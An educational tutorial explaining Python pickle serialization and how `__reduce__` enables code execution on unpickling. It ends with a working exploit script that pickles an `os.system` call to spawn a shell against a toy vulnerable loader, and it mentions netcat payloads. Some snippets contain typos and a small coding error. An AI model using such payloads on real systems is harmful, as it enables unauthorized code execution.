# Insecure deserialization
Before understanding the exploitation process process, we have to understand the core subject
## What is serialization
Serialization is a process where we will pack an object into binary sequence to save it (in a file for example)
Deserialization is the opposite process, thus unpacking a binary sequence to get an object
It exists on many interpreted programming languages, such as PHP, JAVA... But we're looking into python here
## Simple example
Let's say you have a class human which has some methods and some attributes :
```python
class Human:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    def say(self, msg):
        print(self.name+"> "+msg)
    def presentation(self):
        msg = "My name is "+self.name+", i am "+str(self.age)+" years old"
        self.say(msg)
```
Simple class... (AND NOT BUISNESS CLASS !)  
So let's create an object of this class and let's call the method `presentation()` :
```pythpn
h1 = Human("Poop", 2)
h1.presentation()
```
Okay it will do what it has to do, now let's serialize `h1`, in order to do this in python, we have to use the `pickle` module :
```python
import pickle
```
To pack the object into binary sequence, we have to use the function `picke.dumps()`  
Let's have this final code :
```python
import pickle

class Human:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    def say(self, msg):
        print(self.name+"> "+msg)
    def presentation(self):
        msg = "My name is "+self.name+", i am "+str(self.age)+" years old"
        self.say(msg)

h1 = Human("Poop", 2)
<packed object> = pickle.dumps(h1)
print(<packed object>)
```
We could write it to a file using : 
```
file = open("<filename>", "wb") # write binary
file.write(packed)
```
Now to deserialize the saved binary sequence which represents the object, we can use the function `pickle.loads()` :
```python
<unpacked object> = pickle.loads(<packed object>)
```
So if we do in this case :
```python
import pickle

class Human:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    def say(self, msg):
        print(self.name+"> "+msg)
    def presentation(self):
        msg = "My name is "+self.name+", i am "+str(self.age)+" years old"
        self.say(msg)

h1 = Human("Poop", 2)
packed = pickle.dumps(h1) # We save it
del h1 # We don't need h1 anymore because we created an exact copy of it

unpacked = pickle.loads(packed)
unpacked.presentation()
```
We have the full object so we can call it's attrbutes and methodes, in thsi case `presentation()`  
So as result, it will give us this :
```
Poop> My name is Poop, i am 2 years old
```
Which is perfect ! We restored the object !  
## Danger with deserialization
In your class, you can use a methode named `__reduce__(self)` that will be executed when the object is unpacked :
```python
class pwn:
    def __reduce__(self): # Method which is called when the class is loaded
      ...
```
This method can return :
```
- A tuple where there is :  
  - A function
  - Another tuple where the are :
    - Multiple arguments/parameters of the function
So : (<function>, (<argument 1>, <argument 2> ...))
```
And it will execute the function with these arguments  
For example, it could be this :
```python
class pwn:
    def __reduce__(self): # Method which is called when the class is loaded
        return (print, ("PWNED!",)) # Will execute this
```
Which will obviously call `print("PWNED!")` once the object is loaded  
For example, we could write the binary sequence to a file using :
```python
file = open("<filename>", 'wb')
file.write(pwn()) # write the payload to a file
file.close()
```
Then we can restore the object using :
```python
#vuln.py
file = open("<filename>", 'rb')
binary = file.read()
file.close()
obj = pickle.loads(binary)
```
And it will execute the command we've supplied so `print("PWNED!")`  
## Example and getting a shell
Let's say you have this vulnerable code :
```python
import pickle

filename = input("Enter the file name where to load the sequence : ")

file = open(filename, 'rb')
binary = file.read()

obj = pickle.loads(binary)
```
It will ask the user for a file where there is a packed object to load, then it will load it  
Let's create a reliable exploit for this :
```python
#exploit.py
import pickle

command = "cmd.exe" # or "/bin/bash" for example or even a netcat payload

class pwn:
    def __reduce__(self): # Method which is called when the class is loaded
        import os
        return (os.system, (command,)) # Will execute this

payload = pickle.dumps(pwn()) # pack the class into binary sequence

file = open("payload", 'wb')
file.write(payload) # write the payload to a file
file.close()
```
So it will create a class where the `__reduce__` function will return a call to `os.system` with the argument `"cmd.exe"`, or maybe `"/bin/bash"` on linux  
We can use the exploit we just've built :
```cmd
python exploit.py
# Now the exploit is wrote to to the file `payload`
# Let's start the vulnerable program and let's make it load the payload
python vuln.py
# vuln.py>
Enter the file name where to load the sequence : payload
```
Then we should get a shell !
